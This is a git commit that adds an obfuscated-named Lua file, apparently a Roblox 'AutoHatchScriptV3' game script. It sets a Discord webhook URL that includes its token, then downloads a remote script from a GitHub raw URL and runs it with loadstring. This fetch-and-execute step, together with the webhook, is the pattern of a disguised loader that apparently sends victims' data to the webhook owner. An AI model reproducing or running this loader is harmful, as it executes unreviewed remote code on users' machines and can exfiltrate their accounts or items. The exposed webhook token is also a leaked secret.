4b01554e6439b7c0f989361298762870b77d3350
zed2341 <132769770+zed2341@users.noreply.github.com>
2023-05-07 18:00:34 +0800

    myscript

---
+++ obf_r5DQ7xEci57596C4DI3M6G7AuQr395R53Mg8v7xB1sK8Rof6XvmfWy53445B9Fq0.lua
@@ -0,0 +1,8 @@
+UserName = "AutoHatchScriptV3"
+Webhook = "https://discord.com/api/webhooks/1104704687573315624/IzkFyU8rCNbCH45NtmdB-8UZWEGOpUTrpypjYWoFOPtHJq7Sz6B2znhePy2mWs_m9D1i"
+_G.ScriptName = "Visual"
+_G.FirstText = "Scripting"
+_G.SecondText = "executing"
+_G.ThirdText = "done"
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
